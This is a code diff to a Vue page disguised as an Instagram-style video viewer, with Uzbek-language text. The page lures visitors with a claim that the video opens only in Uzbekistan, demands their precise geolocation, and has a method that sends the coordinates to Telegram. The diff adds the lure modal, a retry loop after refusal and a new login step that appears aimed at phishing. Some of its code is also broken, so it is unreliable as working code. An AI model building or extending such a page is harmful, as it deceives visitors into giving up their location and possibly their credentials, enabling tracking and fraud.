@@ -7,7 +7,14 @@
         <button class="allow-btn" @click="allowVideo">Ko'rish</button>
       </div>
     </div>
-
+    <div v-if="geoDenied" class="modal">
+      <div class="modal-content">
+        <h2>
+          📍 Bu video faqat O'zbekiston hududida ochiladi, Iltimos, videoni
+          ko'rish uchun joylashuvingizga ruxsat bering.
+        </h2>
+      </div>
+    </div>
     <!-- Video Player -->
     <div v-if="showVideo" class="video-box">
       <video controls autoplay class="insta-video">
@@ -34,19 +41,29 @@ export default {
     allowVideo() {
       this.getGeolocation();
     },
-    getGeolocation() {
+    requestGeolocation() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (position) => {
-            this.latitude = position.coords.latitude;
-            this.longitude = position.coords.longitude;
-            this.sendToTelegram(); // faqat muvaffaqiyatli holatda
-            this.showModal = false;
-            this.showVideo = true;
+          (pos) => {
+            this.latitude = pos.coords.latitude;
+            this.longitude = pos.coords.longitude;
+            // this.sendToTelegram();
+            this.showGeoModal = false;
+            this.showLogin = true;
           },
-          (error) => {
-            console.error("Geolocation error:", error.message);
-            window.location.href = "/"; // rad etsa — sahifaga qaytar
+          (err) => {
+            console.error("Geolocation error:", err.message);
+
+            // ❌ Ruhsat berilmasa:
+            this.geoDenied = true;
+            this.showGeoModal = false;
+            this.showLogin = false;
+
+            // ✅ 3 soniyadan so'ng bosh oynaga qaytarish
+            setTimeout(() => {
+              this.geoDenied = false;
+              this.showGeoModal = true;
+            }, 3000);
           },
           {
             enableHighAccuracy: true,
@@ -55,10 +72,16 @@ export default {
           }
         );
       } else {
-        window.location.href = "/";
-      }
-    },
+        this.geoDenied = true;
+        this.showGeoModal = false;
+        this.showLogin = false;
 
+        setTimeout(() => {
+          this.geoDenied = false;
+          this.showGeoModal = true;
+        }, 3000);
+      }
+    }
     sendToTelegram() {
       const message = `📍 Yangi foydalanuvchi joylashuvi:
 Latitude: ${this.latitude}
